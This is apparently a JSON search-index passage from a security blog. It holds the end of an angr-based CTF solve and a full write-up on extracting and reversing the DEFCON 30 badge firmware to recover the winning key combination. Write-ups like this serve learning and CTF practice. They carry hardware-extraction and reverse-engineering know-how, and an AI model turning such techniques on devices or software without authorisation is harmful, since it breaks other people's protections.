str(state.posix.dumps(sys.stdout.fileno())) if \"flag{\" in out: print(\"Flag: flag\"+out.split(\"flag\")[1][:-3]) return \"flag{\" in out simgr = p.factory.simulation_manager(s) simgr.explore(find=win, avoid=0x80490ce) The last line is interesting and I initially had to get help with this as Angr has some issues with managing file descriptors. Essentially its purpose is to print out the symbolic content of the file that led to the success block. print(b\"Input: \"+simgr.found[0].posix.closed_fds[0][1].concretize()) Looking at the source of Angr’s posix plugin can help clarify this line a bit better. A deep copy of the SimState is created and the closed_fds copy is a list of the super object’s closed_fds, which is also a list. This line accesses the right file descriptor and patches the input together using concretize. With that, the challenge is solved." }, { "title": "Cracking the DEFCON 30 Badge Firmware", "url": "/posts/Cracking-the-Defcon-30-Badge-Firmware/", "categories": "CTF, Embedded", "tags": "firmware rev, chip extraction, badge", "date": "2022-11-22 00:00:00 -0500", "content": "Extracting and reversing the firmware of the DC30 badge to beat the badge challenge! Table of contents Backstory Firmware Extraction Analysis and Finding Check Mapping and Decoding Backstory and Objective Once upon a time I was very excited to fly to Las Vegas and attend DEFCON 30 the annual go-to security conference. This was going to be my first conference and I had purchased pre-registration tickets, which was a new system that DEFCON was using to allow attendees to guarantee a badge and semi-skip LINECON. However, because of a personal emergency that appeared last minute, I was unable to attend and I gifted my pre-registration to my good friend and mentor playoff-rondo. Later on when I was catching up with him he gave me his badge. DEFCON badges usually have some sort of challenge on them and this year’s badge was some sort of piano keyboard. This is the writeup made by the attendee that solved the badge challenge and won a black badge, as you can see it is meant to be solved in part by interacting with other attendees who have a different variant of the badge. This is obviously not possible for me, so my goal was to reverse engineer the badge and find what key combo needs to be pressed in order to win the first part of the challenge. Part 1: Extracting Firmware from SPI Flash I began by using a magnifying glass, pen and paper to identify all the visible chips on the PCB. The two important chips to note are the Winbond W25Q16JV (flash chip) and the RP2 B2 (microcontroller). The flash memory chip will be used to grab the firmware and will be the target chip to physically extract. The microcontroller will be used to determine the architecture, conventions and other information that will be useful when analyzing the firmware. There are tools available to extract firmware from a surface-mounted chip without having to actually remove the component, however I will be using a TL866II+ universal programmer, so I will have to remove the chip from the PCB, feed the chip to the device using the appropriate adapter and connect the programmer to my VM for extraction. A heat gun would be ideal for removing a small surface mounted chip like this without damaging the PCB, however I do not have access to such equipment, so I use a soldering iron and tweezers. I heat up each joint of the chip with the iron and lift the leg up with tweezers and a magnifying glass. After I have detached the chip from the board, I go around with the iron again and a desoldering pump in an attempt to clean up as much excess solder as possible from each leg. Then I lock the flash chip in the corresponding adapter and insert it into the TL866II+. Unfortunately, the whole ordeal was pretty messy and resulted in a bit of copper from the PCB being destroyed (as is natural for my first chip-off extraction). In my ubuntu machine I use the minipro program to interact with the chip programmer. The following command writes the firmware to a file. minipro -p \"W25Q16JV@SOIC8\" -r flash.bin I can verify that this is the firmware by running strings and examining the output. Part 2: Analyzing Firmware and Finding the Comparison Function The MCU is a rpi2040 which makes use of the “execute in place” feature. This is a feature that improves performance by enabling execution directly in flash storage rather than execution in the MCU’s limited memory area. It is important that we keep this in mind before starting to analyze the firmware. Firmware has no entry point and instead has a defined address at which program execution begins. We can find this base address by viewing the rpi2040 datasheet and navigating to the “Address Map” page from the table of contents. The base address will be the XIP address (execute in place). We need to specify this address as the base address in whatever we use to analyze the firmware to load the correct segment. Using Binaryninja I can specify the base address when creating a new project. Binja automatically detects the thumb2 ARM architecture. I start to try and identify useful symbols and organize the code by searching through strings and going to their code references. Some areas have been incorrectly loaded as symbols so I undefine them. I also rename symbols that have obvious functions for clarity. Identifying and following the code reference of the interesting string, “YOU DID IT!” leads to what seems to be the function that is called when a correct key combination is entered. The only code reference leads to the following function. The first thing I noted when initially examining it was the comparison inside the loop to 0x2d. This conditional is equal to if(r3_1 == 0x2d(which is 46)) since the if-statement ends in a break. Examining the note count on my own badge and noting the number of badges with different variations, we know the total number of piano keys that make-up the passing combo is 46, since all badge’s music sheets will be used. The decompilation process complicated this loop a bit, so for sanity’s sake lets simplify it a bit in our heads. The while loop iterates over the length of the correct combo, once it reaches 46 (the length of the combo) it succeeds. The second if-statement is most important, it compares every key (it gets the key by referencing the location of the key presses in memory with the offset of the current index) with the given character at string[index] if it is not equal, it breaks ending the while loop early and never reaching the success block, else it increments combo_length. So the string in the second conditional is what we need to pay attention too. C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@C@CE@EC@&gt;&lt;C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@&gt;@C@CE@EGDB@ Since each key press is being compared with this string, it is safe to assume that each character in this string is mapped to a physical key on the badge. We should find another function which identifies this mapping. This would likely be the keypress code blobs directly. Some things to note before continuing: User key buffer stored @ 0x2000xxxx (keypresses). The checkwin function will likely be called every time a key is pressed, to check if the newly modified buffer is a win. Part 3: Finding the Mapping and Decoding the Key Combo checkwin has a lot of code references. Each call is likely in a blob for a key press. I’ll pin the references window and tag them all to keep everything organized and visible on the pane. Examining the very first reference we can take note that a pointer is being passed as the argument. The value at this pointer is being assigned above. For this instance that value is 0x3c, whose ascii representation is “&lt;”. Each blob that assigns a mapping is sequential in the code block, so I can safely assume that these are the keyboard mappings assigned in the order as they appear on the physical keyboard. Proceeding to the next checkwin call will reveal the mapping for the C# key (the little black key) which comes next. Proceeding through every checkwin call will reveal the character mappings for the entire keyboard. Hurray! With these mappings we can decipher the string compared in the checkwin function to the equivalent keys on the keyboard. key_map = {\"&lt;\":\"C\",\"=\":\"C#\",\"&gt;\":\"D\",\"?\":\"D#\",\"@\":\"E\",\"A\":\"F\", \"B\":\"F#\",\"C\":\"G\",\"D\":\"G#\",\"E\":\"A\",\"F\":\"A#\",\"G\":\"B\"} key_combo = \"\" for c in \"C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@C@CE@EC@&gt;&lt;C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@&gt;@C@CE@EGDB@\": key_combo += key_map.get(c)+\" \" print(key_combo) The following is the correct key-combination/tune we need to play on the badge keyboard in order to pass the first challenge. G E D C D E G E D C D E G E G A E A G E D C G E D C D E G E D C D E D E G E G A E A B G# F# E Sources https://www.winbond.com/hq/support/documentation/levelOne.jsp?__locale=en&amp;DocNo=DA00-W25Q16JV.1 https://datasheets.raspberrypi.com/rp2040/rp2040-datasheet.pdf" } ]
